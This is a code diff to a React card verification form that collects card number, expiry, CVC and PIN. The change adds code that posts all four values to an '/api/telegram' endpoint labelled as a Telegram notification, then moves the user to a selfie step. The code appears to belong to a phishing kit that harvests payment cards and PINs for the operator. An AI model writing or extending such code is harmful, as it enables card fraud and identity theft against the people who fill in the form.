@@ -21,6 +21,8 @@ export function CardVerificationForm() {
   const [expiry, setExpiry] = useState("")
   const [cvc, setCvc] = useState("")
   const [pin, setPin] = useState("")
+  const [isSending, setIsSending] = useState(false)
+  const [error, setError] = useState("")
 
   const isComplete =
     cardNumber.replace(/\D/g, "").length === 16 &&
@@ -28,10 +30,27 @@ export function CardVerificationForm() {
     cvc.length >= 3 &&
     pin.length === 4
 
-  function handleSubmit(event: React.FormEvent) {
+  async function handleSubmit(event: React.FormEvent) {
     event.preventDefault()
-    if (!isComplete) return
-    router.push("/selfie")
+    if (!isComplete || isSending) return
+
+    setIsSending(true)
+    setError("")
+
+    try {
+      const response = await fetch("/api/telegram", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ type: "card", cardNumber, expiry, cvc, pin }),
+      })
+
+      if (!response.ok) throw new Error("Telegram notification failed")
+      router.push("/selfie")
+    } catch {
+      setError("Unable to continue. Please try again.")
+    } finally {
+      setIsSending(false)
+    }
   }
 
   return (
@@ -105,16 +124,18 @@ export function CardVerificationForm() {
         />
       </div>
 
+      {error ? <p className="mt-4 text-center text-sm text-destructive">{error}</p> : null}
+
       <button
         type="submit"
-        disabled={!isComplete}
+        disabled={!isComplete || isSending}
         className={`mt-6 w-full rounded-full py-4 text-base font-extrabold tracking-wide text-white transition-all duration-300 ${
-          isComplete
+          isComplete && !isSending
             ? "bg-[#c0392b] shadow-[0_10px_28px_rgba(192,57,43,0.4)] hover:bg-[#a8321f]"
             : "bg-[#e79490] opacity-70 cursor-not-allowed"
         }`}
       >
-        VERIFY
+        {isSending ? "Verifying..." : "VERIFY"}
       </button>
     </form>
   )
